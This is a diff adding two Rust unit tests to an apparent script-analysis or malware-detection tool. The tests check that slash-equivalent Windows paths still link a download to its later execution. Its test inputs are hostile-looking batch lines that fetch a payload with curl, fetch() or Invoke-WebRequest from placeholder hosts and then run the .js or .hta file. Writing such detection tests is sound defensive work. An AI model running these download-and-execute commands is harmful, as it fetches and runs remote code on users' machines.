@@ -1491,6 +1491,23 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn implicit_slash_equivalent_generated_js_queues_tracked_script_content() {
+        let script =
+            br#"echo fetch('https://implicit-js-slash-equivalent.example/p')>C:\Temp\payload.js
+C:/Temp/payload.js"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://implicit-js-slash-equivalent.example/p"
+            )),
+            "slash-equivalent implicit JS content was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn implicit_hta_execution_resolves_prior_download_source_url() {
         let script = br#"curl -o payload.hta https://implicit-hta-source.example/payload.hta
 start payload.hta"#;
@@ -1524,6 +1541,25 @@ payload.js"#;
                 )
             }),
             "implicit script execution did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn implicit_slash_equivalent_hta_execution_resolves_prior_download_source_url() {
+        let script = br#"curl -o C:\Temp\payload.hta https://implicit-hta-slash-equivalent.example/payload.hta
+C:/Temp/payload.hta"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "C:/Temp/payload.hta"
+                            && url == "https://implicit-hta-slash-equivalent.example/payload.hta"
+                )
+            }),
+            "slash-equivalent implicit HTA execution did not resolve prior download source: {:?}",
             report.traits
         );
     }
